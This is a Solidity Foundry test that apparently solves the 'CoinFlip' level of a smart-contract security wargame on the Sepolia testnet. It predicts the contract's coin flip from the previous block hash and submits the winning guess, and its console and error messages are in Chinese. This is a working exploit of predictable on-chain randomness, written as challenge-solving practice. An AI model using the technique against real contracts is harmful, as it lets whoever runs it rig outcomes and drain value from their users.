pragma solidity ^0.8.19;

import "../lib/forge-std/src/Test.sol";

interface ICoinFlip {
    function consecutiveWins() external view returns (uint256);

    function flip(bool _guess) external returns (bool);
}

contract CoinFlipTest is Test {
    uint256 public constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    ICoinFlip level_3 = ICoinFlip(0xf0DF8C521C17F571b0A0f573FF0f552Fb98bA1E8);

    address payable private me = payable(address(this));

    function setUp() public {
        vm.createSelectFork("sepolia");
    }

    function test_level_3() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        uint256 coinFlip = blockValue / FACTOR;

        bool side = coinFlip == 1 ? true : false;

        console.log(unicode"现在的side值为：", side);

        bool is_success = level_3.flip(side);

        require(is_success, unicode"猜错了！");
    }
}
